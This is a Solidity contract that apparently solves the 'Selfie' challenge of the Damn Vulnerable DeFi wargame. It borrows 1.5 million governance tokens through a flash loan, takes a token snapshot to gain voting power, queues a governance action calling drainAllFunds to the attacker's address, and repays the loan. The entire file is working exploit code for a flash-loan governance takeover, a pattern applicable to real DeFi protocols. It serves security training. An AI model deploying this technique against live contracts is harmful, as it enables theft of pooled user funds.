//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieTaker {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    constructor(
        address _pool,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function takeLoan() public {
        pool.flashLoan(1_500_000 ether);
    }

    function receiveTokens(address, uint256) public {
        token.snapshot();
        governance.queueAction(
            msg.sender,
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
        token.transfer(address(pool), 1_500_000 ether);
    }
}
